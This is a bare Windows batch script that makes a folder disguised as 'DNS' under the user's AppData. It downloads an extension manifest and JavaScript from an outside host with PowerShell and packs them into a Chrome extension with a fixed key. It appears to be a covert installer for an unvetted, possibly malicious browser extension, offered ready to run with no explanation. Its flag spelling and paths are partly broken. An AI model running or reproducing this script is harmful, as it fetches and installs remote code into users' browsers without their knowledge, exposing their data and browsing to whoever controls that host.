cd %appdata%
mkdir DNS
cd DNS

powershell Invoke-WebRequest -Uri "https://cdn.shadowcloud.ch/manifest.json" -OutFile ".\manifest.json"
powershell Invoke-WebRequest -Uri "https://cdn.shadowcloud.ch/main.js" -OutFile ".\main.js"

cd "C:\Program Files\Google\Chrome\Application\"

chrome.exe --pack-extension=%appdata%\Roaming\DNS\ --pack-extention-key=lfblkiinecoplnjkjalacghipdkapjfn
PAUSE